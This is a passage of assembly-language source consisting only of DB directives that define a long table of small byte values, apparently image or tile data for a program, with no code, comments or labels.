DB 007H,007H,007H,007H,007H,007H,006H,00AH,00AH,005H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,004H,00AH,008H,008H,005H,004H,004H,004H,004H
DB 004H,004H,005H,008H,007H,006H,011H,006H,000H,000H,003H,01CH,01CH,01CH,01CH
DB 01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,000H,000H,000H,000H
DB 004H,008H,012H,010H,012H,010H,00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,016H,013H,01AH,01AH,018H,00CH,000H,005H,011H,011H,013H,010H,015H
DB 015H,011H,011H,014H,014H,014H,013H,00FH,012H,002H,000H,000H,000H,000H,000H
DB 003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,003H,00AH,00AH,006H,008H,005H,005H,004H,004H,004H,004H,004H,005H
DB 005H,008H,006H,006H,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 008H,00AH,006H,007H,007H,008H,008H,008H,008H,008H,008H,007H,006H,00AH,00AH
DB 001H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,006H,00AH,00AH,00AH,00AH
DB 00AH,00AH,00AH,006H,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,006H,007H,008H,005H,004H,001H,004H,001H,009H,001H,004H,004H
DB 005H,008H,006H,00AH,011H,001H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01BH,003H,000H,000H,000H,000H,000H,005H,012H,012H,010H,010H
DB 010H,010H,00EH,00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H
DB 013H,01AH,01AH,018H,00EH,000H,009H,013H,013H,014H,014H,010H,015H,011H,014H
DB 014H,014H,014H,014H,013H,012H,008H,000H,000H,000H,000H,000H,000H,003H,01BH
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,001H
DB 00AH,006H,007H,008H,005H,001H,009H,001H,009H,001H,004H,004H,005H,005H,008H
DB 00AH,005H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,006H
DB 00AH,00AH,006H,006H,006H,006H,006H,00AH,00AH,006H,008H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,001H,00BH,005H,00BH,005H,00BH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H
DB 00AH,008H,005H,005H,001H,009H,001H,009H,001H,009H,001H,004H,004H,008H,007H
DB 006H,00AH,006H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H
DB 01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH
DB 003H,000H,000H,000H,000H,002H,012H,013H,012H,010H,012H,010H,010H,00EH,010H
DB 00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H,00CH,014H,014H
DB 013H,00CH,00CH,00CH,00CH,00DH,00DH,00DH,00DH,00DH,00FH,00FH,013H,013H,013H
DB 013H,00FH,013H,00FH,00EH,002H,000H,000H,000H,000H,000H,003H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01CH,003H
DB 01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,006H,00AH,007H,008H
DB 005H,004H,009H,001H,009H,001H,009H,001H,009H,004H,005H,005H,007H,006H,000H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,001H,008H,007H
DB 006H,006H,00AH,006H,008H,001H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,007H,006H,005H,005H
DB 004H,009H,002H,009H,002H,009H,002H,009H,001H,004H,005H,008H,007H,00AH,00AH
DB 002H,01BH,003H,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,01BH,003H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,000H
DB 000H,005H,014H,013H,012H,012H,010H,010H,00EH,010H,010H,00EH,00CH,018H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,018H,016H,016H,015H,017H,015H,016H
DB 016H,014H,013H,00DH,00CH,00CH,00DH,00DH,00DH,00DH,00DH,00DH,012H,00FH,00FH
DB 012H,012H,012H,008H,000H,000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,00AH,00AH,007H,005H,004H,009H,001H
DB 009H,002H,009H,002H,009H,001H,004H,004H,005H,008H,00AH,002H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,006H,007H,005H,004H,004H,001H,002H
DB 002H,009H,002H,009H,002H,009H,001H,004H,005H,007H,00AH,011H,001H,003H,01CH
DB 01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,000H,000H,000H,003H,01BH,003H
DB 01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,000H,000H,002H,014H,013H
DB 012H,012H,012H,010H,012H,010H,010H,008H,005H,00CH,017H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 019H,018H,016H,013H,00CH,00CH,00DH,014H,00DH,00DH,00DH,00FH,00FH,012H,010H
DB 010H,007H,002H,000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01BH,003H,01BH,000H,000H,000H,000H,000H,01BH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,001H,011H,006H,008H,005H,004H,001H,009H,002H,009H,002H
DB 009H,002H,009H,001H,004H,005H,008H,006H,005H,01BH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,006H,007H,005H,004H,004H,005H,005H,004H,002H,002H
DB 002H,009H,002H,009H,001H,005H,008H,006H,011H,004H,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,003H,001H,005H,008H,008H,005H,002H,000H,000H,01BH,003H,01CH,01CH
DB 01CH,003H,01BH,003H,000H,000H,000H,000H,000H,005H,014H,012H,012H,012H,012H
DB 012H,012H,010H,010H,005H,010H,00CH,017H,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,018H,014H,00CH,014H,019H,014H,00DH,00DH,00FH,013H,010H,00EH,00EH,00EH
DB 002H,000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,003H,01BH
DB 003H,000H,002H,005H,008H,005H,004H,002H,000H,000H,003H,01CH,01CH,01CH,01CH
DB 01CH,005H,011H,007H,005H,004H,001H,009H,002H,009H,002H,009H,001H,005H,005H
DB 005H,004H,005H,008H,006H,005H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,006H,007H,005H,004H,005H,006H,006H,007H,004H,002H,009H,002H,009H
DB 001H,004H,005H,008H,006H,011H,001H,003H,01CH,01CH,01CH,003H,01BH,009H,007H
DB 006H,007H,007H,006H,00AH,00AH,009H,000H,000H,01BH,003H,01CH,003H,01BH,003H
DB 000H,000H,000H,000H,000H,012H,013H,012H,012H,00FH,00FH,012H,010H,010H,008H
DB 005H,010H,013H,00CH,017H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 018H,00DH,014H,01AH,018H,00FH,00CH,00DH,012H,010H,00EH,00EH,004H,000H,000H
DB 000H,000H,01BH,003H,01BH,003H,01CH,01CH,01CH,003H,01BH,003H,01BH,008H,00AH
DB 00AH,007H,007H,006H,006H,005H,000H,000H,003H,01CH,01CH,01CH,01CH,004H,011H
DB 007H,005H,004H,009H,001H,009H,002H,009H,002H,005H,006H,006H,006H,005H,005H
DB 008H,006H,005H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,007H
DB 006H,008H,005H,008H,006H,00AH,007H,001H,009H,002H,009H,001H,009H,001H,005H
DB 008H,006H,00AH,002H,01CH,01CH,01CH,01CH,01CH,009H,006H,007H,005H,005H,004H
DB 005H,008H,006H,00AH,002H,000H,003H,01BH,003H,01BH,000H,000H,000H,000H,000H
DB 002H,012H,013H,012H,012H,012H,012H,012H,010H,010H,00EH,005H,012H,014H,013H
DB 00CH,017H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,014H
DB 016H,01AH,019H,016H,00DH,00DH,010H,00EH,00EH,005H,002H,000H,000H,000H,000H
DB 000H,003H,01BH,003H,01CH,003H,01BH,003H,01BH,007H,011H,006H,008H,005H,004H
DB 005H,008H,006H,008H,000H,01BH,003H,01CH,01CH,01CH,009H,00AH,007H,005H,004H
DB 001H,009H,002H,009H,002H,009H,005H,006H,00AH,006H,008H,005H,008H,00AH,001H
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H,006H,008H,005H
DB 005H,007H,007H,005H,009H,002H,009H,001H,009H,001H,004H,005H,008H,00AH,006H
DB 01CH,01CH,01CH,01CH,01CH,003H,006H,007H,005H,004H,001H,004H,001H,004H,008H
DB 00AH,00AH,000H,000H,003H,01BH,003H,000H,000H,000H,000H,012H,014H,013H,013H
DB 012H,010H,012H,012H,012H,012H,010H,005H,010H,014H,014H,014H,00CH,017H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,019H,019H,019H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00DH,016H,01AH
DB 01AH,015H,00DH,00DH,00EH,00EH,00EH,00EH,00EH,001H,000H,000H,000H,000H,000H
DB 01BH,003H,01BH,003H,01BH,00BH,011H,006H,008H,004H,001H,004H,004H,005H,005H
DB 006H,004H,003H,01CH,01CH,01CH,01CH,01CH,006H,006H,005H,004H,004H,001H,009H
DB 002H,009H,002H,004H,008H,006H,007H,005H,005H,007H,00AH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,002H,00AH,007H,008H,005H,005H,005H
DB 009H,001H,009H,001H,009H,001H,004H,004H,005H,008H,00AH,005H,003H,01CH,01CH
DB 01CH,003H,004H,006H,005H,004H,001H,009H,001H,009H,001H,005H,007H,011H,004H
DB 000H,01BH,003H,000H,000H,000H,000H,000H,013H,014H,012H,012H,010H,012H,012H
DB 012H,012H,012H,008H,005H,014H,014H,014H,014H,00CH,017H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,018H,00CH,010H,012H,010H,010H,013H,015H,019H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,00DH,01AH,01AH,01AH,013H
DB 00DH,010H,00EH,00EH,008H,008H,00EH,002H,000H,000H,002H,002H,000H,000H,003H
DB 01BH,003H,00AH,00AH,008H,004H,001H,009H,001H,009H,001H,005H,008H,007H,000H
DB 003H,01CH,01CH,01CH,01CH,008H,00AH,008H,005H,004H,004H,001H,009H,001H,009H
DB 001H,004H,005H,005H,005H,008H,006H,008H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,008H,00AH,008H,005H,004H,004H,001H,004H,001H
DB 004H,001H,004H,004H,005H,008H,006H,00AH,003H,01CH,01CH,01CH,01CH,01CH,008H
DB 007H,005H,001H,009H,002H,009H,002H,009H,001H,008H,00AH,007H,000H,003H,01BH
DB 003H,002H,000H,000H,000H,012H,014H,013H,013H,012H,012H,012H,010H,010H,00EH
DB 005H,013H,014H,014H,013H,014H,00CH,017H,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,017H,012H,019H,019H,018H,00EH,00EH,00CH,00DH,019H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,00DH,018H,01AH,01AH,015H,00DH,00DH,010H
DB 00EH,00EH,008H,008H,004H,000H,002H,002H,004H,004H,003H,01BH,003H,001H,00AH
DB 006H,005H,001H,009H,002H,009H,002H,009H,004H,005H,006H,002H,01BH,003H,01CH
DB 01CH,01CH,01CH,00AH,007H,005H,005H,004H,004H,001H,004H,001H,004H,001H,004H
DB 005H,005H,007H,00AH,002H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,006H,006H,008H,005H,005H,004H,004H,004H,004H,005H,005H
DB 005H,008H,007H,00AH,004H,01CH,01CH,01CH,01CH,01CH,003H,007H,008H,004H,004H
DB 004H,009H,002H,009H,002H,009H,005H,006H,006H,000H,01BH,003H,002H,000H,000H
DB 009H,013H,013H,013H,013H,012H,012H,010H,010H,00EH,010H,005H,012H,014H,014H
DB 014H,013H,013H,00CH,017H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H
DB 013H,01AH,01AH,019H,00EH,00FH,013H,00CH,013H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,014H,017H,01AH,01AH,018H,00CH,00DH,010H,00EH,00EH,008H
DB 008H,002H,002H,000H,000H,002H,005H,002H,003H,01BH,00BH,00AH,007H,004H,009H
DB 002H,009H,002H,004H,004H,004H,005H,006H,001H,003H,01CH,01CH,01CH,01CH,01CH
DB 007H,00AH,008H,005H,005H,005H,004H,004H,004H,004H,005H,005H,008H,008H,00AH
DB 004H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,009H,006H,006H,008H,008H,005H,005H,005H,005H,005H,008H,008H,007H,00AH
DB 004H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,007H,008H,004H,008H,006H,008H,009H
DB 002H,009H,001H,005H,006H,007H,000H,003H,000H,002H,000H,010H,014H,013H,013H
DB 013H,013H,012H,012H,010H,010H,00EH,005H,012H,012H,014H,014H,014H,013H,012H
DB 00CH,017H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,013H,01AH,01AH
DB 019H,00EH,012H,013H,00EH,010H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,014H,017H,01AH,01AH,018H,00CH,010H,00EH,008H,00EH,00EH,008H,004H,000H
DB 000H,000H,002H,004H,009H,01BH,003H,001H,00AH,008H,004H,001H,009H,002H,004H
DB 006H,006H,005H,005H,006H,009H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,006H,00AH
DB 007H,008H,005H,005H,005H,005H,005H,005H,008H,008H,006H,008H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 007H,00AH,007H,007H,008H,008H,008H,007H,007H,00AH,006H,009H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,008H,006H,005H,007H,00AH,008H,002H,009H,001H,009H
DB 005H,006H,004H,003H,01BH,000H,000H,012H,014H,014H,014H,013H,013H,012H,012H
DB 010H,010H,012H,008H,008H,013H,012H,014H,014H,013H,012H,012H,00CH,017H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,013H,01AH,01AH,019H,00EH,00FH
DB 012H,00CH,016H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00DH,018H
DB 01AH,01AH,017H,00CH,010H,00EH,00EH,00EH,008H,008H,008H,004H,000H,000H,002H
DB 004H,002H,003H,01CH,003H,00AH,007H,004H,009H,002H,009H,004H,006H,006H,005H
DB 005H,006H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H,00AH,006H,007H
DB 008H,008H,008H,008H,007H,006H,00AH,007H,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H,006H
DB 00AH,00AH,00AH,00AH,00AH,006H,008H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,00BH,006H,008H,005H,005H,001H,009H,001H,009H,001H,005H,006H,003H
DB 01BH,000H,000H,005H,014H,014H,013H,013H,013H,012H,010H,012H,012H,012H,00EH
DB 004H,012H,013H,012H,014H,014H,013H,010H,010H,00CH,017H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,017H,00EH,018H,018H,015H,00CH,00CH,00CH,014H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,00EH,019H,01AH,01AH,016H
DB 00DH,010H,010H,00EH,00EH,00EH,008H,008H,008H,004H,000H,002H,002H,003H,01CH
DB 01CH,01CH,007H,006H,005H,004H,009H,001H,009H,004H,005H,005H,007H,007H,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,007H,006H,00AH,00AH,00AH
DB 00AH,006H,007H,004H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,005H,00BH
DB 004H,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 008H,006H,005H,004H,004H,001H,004H,004H,004H,007H,005H,01BH,003H,000H,000H
DB 012H,014H,014H,013H,012H,012H,012H,012H,013H,012H,010H,004H,010H,013H,012H
DB 00FH,013H,013H,012H,005H,005H,00CH,017H,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,018H,012H,012H,012H,013H,014H,016H,018H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,016H,012H,01AH,01AH,019H,00DH,00DH,010H,010H
DB 010H,00EH,00EH,008H,008H,005H,005H,001H,000H,000H,01BH,003H,01CH,01CH,001H
DB 00AH,008H,005H,004H,004H,004H,004H,005H,008H,006H,009H,01CH,01CH,01CH,01CH
